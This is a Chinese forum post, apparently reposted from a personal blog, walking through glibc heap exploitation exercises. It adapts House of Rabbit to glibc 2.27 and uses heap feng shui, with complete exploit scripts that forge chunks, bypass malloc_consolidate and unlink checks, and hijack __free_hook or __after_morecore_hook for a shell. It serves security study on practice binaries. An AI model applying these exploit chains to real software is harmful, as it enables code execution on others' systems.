> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1562783-1-1.html)

> [md] 这一节主要包含两个部分，高版本下的 House of Rabbit 以及堆风水 ## House of Rabbit 在 [House of Rabbit](https://hack1s.fun/2021......

 ![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg) 呆毛王与咖喱棒

这一节主要包含两个部分，高版本下的 House of Rabbit 以及堆风水

House of Rabbit
---------------

在 [House of Rabbit](https://hack1s.fun/2021/12/11/heaplab-house-of-rabbit/) 中学习到了 House of Rabbit 的利用方式，这种利用思路通过修改 fastbin 的 fd 指针、触发`malloc_consolidate`将 fastbin 放入到 unsortedbin、进一步修改 fake chunk 的大小使 chunk 放入到 largebin 进而得到任意地址的写能力。

但是这里有一个前提就是之前的 glibc 版本比较低 (2.25)

在 glibc 2.27 中的`malloc_consolidate`函数中增加了对 fastbin 的 size 的[检查](https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f5aafd2c0511cd5a57174e12c2192e3fea3e0b7b;hp=48106f9bd455620cbaf1a30bcfbd095cb16791cc;hb=249a5895f120b13290a372a49bb4b499e749806f;hpb=1a51e46e4a87e1cd9528ac5e5656011636e4086b)

```
--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -4431,6 +4431,12 @@ static void malloc_consolidate(mstate av)
     p = atomic_exchange_acq (fb, NULL);
     if (p != 0) {
       do {
+       {
+         unsigned int idx = fastbin_index (chunksize (p));
+         if ((&fastbin (av, idx)) != fb)
+           malloc_printerr ("malloc_consolidate(): invalid chunk size");
+       }
+
        check_inuse_chunk(av, p);
        nextp = p->fd;

```

可以看到在`check_inuse_chunk`之前检查了`fastbin(av,idx)`和本身`fb`应该有的大小是否相等

之前我们利用时正确执行`malloc_consolidate`的方法是将伪造的 fastbin chunk 的 size 设置为 1，这样使得绕过对前后的 chunk 进行合并时的 unlink 检查

增加了这样的检查之后就没办法简单的修改 size 为 1 绕过

来看一下链接在 2.27 版本 glibc 的实例

![](https://static.hack1s.fun/images/2021/12/13/image-20211213124814423.png)

这个程序大体上和之前的程序是一样的，差异的地方主要有两点

一是原本的 age 字段变成了 username 字段，这样可以在 fake chunk 中输入的范围变得更大了；

二是 glibc 的版本从 2.25 变成了 2.27；

三是程序没有像之前一样泄漏 glibc 的地址；

首先我们先 copy 过来之前的 exploit，在这基础上进一步修改

```
username = p64(0) + p64(0x21)
io.sendline(username)
io.recvuntil("> ")

large = malloc(0x5fff8,'aaaa')
free(mem)
large = malloc(0x5fff8,'aaaa')

fast_A = malloc(0x18,'aaaa')
fast_B = malloc(0x18,'bbbb')

free(fast_A)
free(fast_B)
free(fast_A)

malloc(0x18, p64(elf.sym.username))

consolidate = malloc(0x88, 'cccc')
free(consolidate)

fake_size = 0x80001
amend_username(p64(0)+p64(fake_size))
malloc(0x80008, 'dddd')

fake_size = 0xfffffffffffffff1
amend_username(p64(0)+p64(fake_size))

```

直接运行一下，不出意外的在触发 consolidate 时报错

出错的原因也就是 unlink 时出的错

*   堆管理器首先顺着 fastbin 的 fd 找到了 username 的部分；
*   之后从 username 伪造的 chunk 向下找这个 nextchunk
*   这时找到的是一块空的区域，这里 size 字段是全零，堆管理器接着找这个 nextchunk 的下一个 chunk，我们暂且称为 nnchunk
*   发现 nnchunk 的 prev_inuse 字段为 0，堆管理器以为 nextchunk 也是 free 的，可以和 fake chunk 合并
*   于是触发了 unlink，在 unlink 的 unsortedbin size 检查时报错

这里没办法设置 fake chunk 的 size 为 1 绕过，但是可以尝试设置 fake chunk 后面的内容，在这后面再伪造一个 chunk 出来

```
username = p64(0) + p64(0x21) + p64(0)*2+p64(0x20) + p64(0x10) + p64(0) + p64(0x21)

```

这样运行之后就成功将这个 chunk 放入到了 unsortedbin 中

![](https://static.hack1s.fun/images/2021/12/13/image-20211213171150499.png)

接下来由于没有 libc 的地址，需要首先设法得到 libc 的基地址，否则没办法修改`__free_hook`

这个程序中有办法读内容的只有 target 这个菜单

那么首先尝试利用任意地址写的方法修改 target 的内容

之前修改地址的 exploit 为

```
distance = 0xffffffffffffffff - elf.sym.username + elf.sym.target - 0x20
malloc(distance, 'eeee')
malloc(0x18, 'Much Win')

```

利用同样的 exploit 在 glibc2.27

但是在`malloc(distance)`这里会报错

报错的内容是`corrupted size vs. prev_size`

这个错误在之前 [House of Einherjar](https://hack1s.fun/2021/12/09/heaplab-posion-null-byte/) 中也见到过

![](https://static.hack1s.fun/images/2021/11/26/image-20211126213304064.png)

比较的具体位置是这里，原因是顺着 fake chunk 向下找到的 nextchunk，找到的`prev_size`字段和直接看到的 fake chunk 的 size 大小不同

不过还好我们伪造的 fake chunk 大小是 0xfffffff0

正好可以在内存循环一圈，最后 nextsize 的位置正好在伪造的 chunk 上面

可以尝试将整个 fake chunk 向下挪一点，让这个最终的 prev_size 字段落在 username 内，修改成合适的大小就可以通过这个检查

```
username = p64(0)*3 + p64(0x21) + p64(0)*2+p64(0x20) + p64(0x10) + p64(0) + p64(0x21)
# ...
# ...
malloc(0x18, elf.sym.username+0x10)
# ...
# ...
amend_username(p64(0)*3 + p64(fake_size))
# ...
# ...
amend_username(p64(0xfffffffffffffff0)+p64(0)*2+p64(fake_size))

```

需要修改的主要是几次修改 username 的地方，以及 malloc 时修改指针的位置时

但是增加两个 p64(0) 的话就超过了 username 的长度限制，导致最后的 nnchunk 的 size 没有输入进去

这会触发 unlink 的错误

解决方法是修改 nextchunk 的 size 为 1

虽然 fastbin 做了 size 的检查，但是 2.27 中对于 unlink 时 unsortedbin 的 size 检查还是和之前一样的

```
username = p64(0)*3 + p64(0x21) + p64(0)*2 + p64(0x20)+p64(1)

```

最终的 exploit

```
username = p64(0)*3 + p64(0x21) + p64(0)*2+p64(0x20) + p64(0x1)

io.sendafter("username: ", username)
io.recvuntil("> ")
io.timeout = 0.1

mem = malloc(0x5fff8, "Y"*8) # Allocated via mmap().
free(mem) # Freeing an mmapped chunk increases the mmap threshold to its size.
mem = malloc(0x5fff8, "Z"*8)

dup = malloc(0x18, "A"*8)
safety = malloc(0x18, "B"*8)

free(dup)
free(safety)
free(dup)

malloc(0x18, p64(elf.sym.username+0x10)) # Address of fake chunk.

consolidate = malloc(0x88, "C"*8)
free(consolidate)

fake_size = 0x80001
amend_username(p64(0)*3+p64(fake_size))                                                              
malloc(0x80008, "D"*8)

fake_size = 0xfffffffffffffff1
amend_username(p64(0xfffffffffffffff0)+p64(0)*2+p64(fake_size))

# =============================================================================
# write target
distance = delta(elf.sym.username+0x10, elf.sym.target - 0x20)
malloc(distance,'eeee')

malloc(0x18, 'Much Win\x00')


```

最终就可以修改 target 的内容为目标的字符串

![](https://static.hack1s.fun/images/2021/12/15/image-20211215153632218.png)

接下来如果想要获取到代码执行权限需要有一个 libc 的地址泄漏，但是目前已经申请满了 9 个 chunk

后面怎么不多申请拿到代码执行能力还是没有想到

原博客地址, [http://hack1s.fun/](http://hack1s.fun/)

堆风水
---

heap fengshui，也叫 heap grooming

堆风水严格来说不算是一个利用的技巧，这种方法是通过控制申请的先后顺序、chunk 的大小，让堆中的排布符合预期的状态。

在以一个和 House of Rabbit 类似的例子说明

![](https://static.hack1s.fun/images/2021/12/15/image-20211215190553967.png)

相比之前的差别在于无法申请 fastbin 大小的 chunk

另外可以申请的次数从 9 次变成了 13 次

如果还想要使用 house of orange 的方法，那么难点就在于如何能在不直接使用 malloc 的情况下得到一个指向 fastbin 大小的 chunk 的指针

首先我们知道这个程序存在 double free 的漏洞，想要得到一个 fastbin 中的 chunk 需要有一个指向 fastbin 大小的空间的指针

一个思路就是利用 unsortedbin 的 remainder

```
chunk_A = malloc(0x88, "AAAA")
chunk_B = malloc(0x88, "BBBB")

free(chunk_A)
free(chunk_B)

chunk_C = malloc(0xa8, "CCCC")
chunk_D = malloc(0x88, "DDDD")

free(chunk_C)
chunk_E = malloc(0x88, "AAAA")

```

首先申请两个 0x90 大小的 A、B，之后 free 掉这两个 chunk，这时 A 和 B 都会合并在 top chunk 中

![](https://static.hack1s.fun/images/2021/12/16/image-20211216111751282.png)

虽然 A、B 都已经被 free 掉了，但是从 top chunk 往下查看内存还是可以看到原本 A、B 的区域

这时我们重新申请大小为 0xb0（0x90+0x20）的空间，即 C

以及主要用于防止 C 与 top Chunk 合并的 D

![](https://static.hack1s.fun/images/2021/12/16/image-20211216112145951.png)

这时 B 指向的位置就在 C 的后半部分

接下来`free`掉 C，并再申请一个大小 0x90 的 chunk

这时堆触发 remaindering，B 指向的位置就会是一个 0x20 大小的 unsortedbin

![](https://static.hack1s.fun/images/2021/12/16/image-20211216112357521.png)

这时利用 B 这个指针，调用`free(B)`就可以将其再放入到 fastbin

![](https://static.hack1s.fun/images/2021/12/16/image-20211216113303858.png)

这时这个 0x20 大小的 chunk 就在 fastbin 中了

但是目前的问题在于，fastbin 的 fd 破坏了 unsortedbin 的双向链表，如果这时继续申请可能会出错

如何既保留 0x20 这样一个 size 字段，又能够不破坏已有 bins 指针呢？

在调用`free(B)`之前，再使用`free(E)`、`free(D)`

这样让目前有的几个 chunk 全部再合并到 top chunk 中，这样 bins 就会被清空，同时这个 0x20 的值还会留在内存里面

```
chunk_A = malloc(0x88, "AAAA")
chunk_B = malloc(0x88, "BBBB")

free(chunk_A)
free(chunk_B)

chunk_C = malloc(0xa8, "CCCC")
chunk_D = malloc(0x88, "DDDD")

free(chunk_C)
chunk_E = malloc(0x88, "AAAA")

free(chunk_E)
free(chunk_D)

free(chunk_B)

```

可以看到这样就将其放进了 fastbin 中

![](https://static.hack1s.fun/images/2021/12/16/image-20211216115009854.png)

接下来就是修改这一个指针了

申请两次 0x90 大小的 chunk，第二次的请求写入的地方就是 fastbin 的 fd 指针

![](https://static.hack1s.fun/images/2021/12/16/image-20211216115333311.png)

剩下的技巧就是和 house of rabbit 类似了

这里主要想要说的是堆风水这种技巧可以通过精巧的控制堆的申请次序和申请大小，使堆中排布变成需要的样子

接下来进一步尝试获取 shell，主要需要处理的地方和之前是一样的，增加 mmap 的阈值、增大程序的 system_mem 等等

```
age = 1
# ====增大mmap阈值
large = malloc(0x5fff8, 'aaaa')
free(large)

# ====增大system_mem
large = malloc(0x5fff8, 'aaaa')

# ====修改fastbin的fd指针
chunk_A = malloc(0x88, "AAAA")
chunk_B = malloc(0x88, "BBBB")

free(chunk_A)
free(chunk_B)

chunk_C = malloc(0xa8, "CCCC")
chunk_D = malloc(0x88, "DDDD")

free(chunk_C)
chunk_E = malloc(0x88, "AAAA")

free(chunk_E)
free(chunk_D)

free(chunk_B)

chunk_F = malloc(0x88, 'FFFF')
chunk_G = malloc(0x88, p64(elf.sym.user))
# =======

# ====触发malloc_consolidate
free(large)

# ====sort到largebin
amend_age(0x80001)
malloc(0x80008, 'xxxx')

# ====修改free_hook
distance = libc.sym.__free_hook - 0x20 - elf.sym.user
amend_age(distance+0x99)

binsh = malloc(distance,'/bin/sh')
malloc(0x88,p64(0)+p64(libc.system))

free(binsh)

```

这时发现这个程序又加了一个修改，就是`malloc`之后只能写入 8 个字节

所以没办法覆盖`free_hook`的值，因为`free_hook`是 8 字节对齐，而不是 16 字节对齐的

这里就又介绍到一个可以修改的`hook`地址`__after_morecore_hook`

![](https://static.hack1s.fun/images/2021/12/16/image-20211216163018302.png)

`__morecore`和`__after_morecore_hook`都是会在需要 extend 堆的空间时触发

终端中执行`man malloc_hook`可以看到关于这个的介绍

> The variable `__after_morecore_hook` points at a function that is called each time after `sbrk` was asked for more memory

而 extend 堆的空间需要申请的内存大小应该是小于`mmap`的 threshold，大于 system_mem 和 top chunk 的值，在目前这个 binary 的运行环境下应该是 0x60000-0x61000 之间的值

在 gdb 中设置一个硬件断点在`__after_morecore_hook`上面

![](https://static.hack1s.fun/images/2021/12/16/image-20211216170830867.png)

之后申请一个 0x60008 大小的内容

![](https://static.hack1s.fun/images/2021/12/16/image-20211216170930255.png)

看到程序停在了这里，从源码我们可以看到调用这个 hook 的时候是没有参数的

```
(*hook)();

```

所以我们没办法像`free_hook`那样改成 system 之后传入`/bin/sh`了

那么可以尝试使用 one_gadget

测试后发现`rax==NULL`这个条件是满足的

```
age = 1
# ====增大mmap阈值
large = malloc(0x5fff8, 'aaaa')
free(large)

# ====增大system_mem
large = malloc(0x5fff8, 'aaaa')

# ====修改fastbin的fd指针
chunk_A = malloc(0x88, "AAAA")
chunk_B = malloc(0x88, "BBBB")

free(chunk_A)
free(chunk_B)

chunk_C = malloc(0xa8, "CCCC")
chunk_D = malloc(0x88, "DDDD")

free(chunk_C)
chunk_E = malloc(0x88, "AAAA")

free(chunk_E)
free(chunk_D)

free(chunk_B)

chunk_F = malloc(0x88, 'FFFF')
chunk_G = malloc(0x88, p64(elf.sym.user))
# =======

# ====触发malloc_consolidate
free(large)

# ====sort到largebin
amend_age(0x80001)
malloc(0x80008, 'xxxx')

# ====修改free_hook
distance = libc.sym.__after_morecore_hook - 0x20 - elf.sym.user
amend_age(distance+0xa1)
malloc(distance,'HHHH')

malloc(0x88,p64(libc.address+0x3ff5e))
malloc(0x60008, "")

```

最后这样就可以获得权限了

不过这个 binary 有点为了出题而出题的意思，实际上一般很少会用到`__after_morecore_hook`这个值 ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) 好东西阿这是![](https://avatar.52pojie.cn/images/noavatar_middle.gif)酋长萨尔 A

> [酋长萨尔 A 发表于 2021-12-16 19:08](https://www.52pojie.cn/forum.php?mod=redirect&goto=findpost&pid=41040634&ptid=1562783)  
> 好东西阿这是

好复杂。。。。。。。![](https://avatar.52pojie.cn/images/noavatar_middle.gif)Alibabamemory 谢谢分享![](https://avatar.52pojie.cn/images/noavatar_middle.gif)tiankengshushu 谢谢分享![](https://avatar.52pojie.cn/images/noavatar_middle.gif)kone153 太强了吧楼主，收藏了收藏了 ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) p0weredBy 楼主很厉害, 谢谢楼主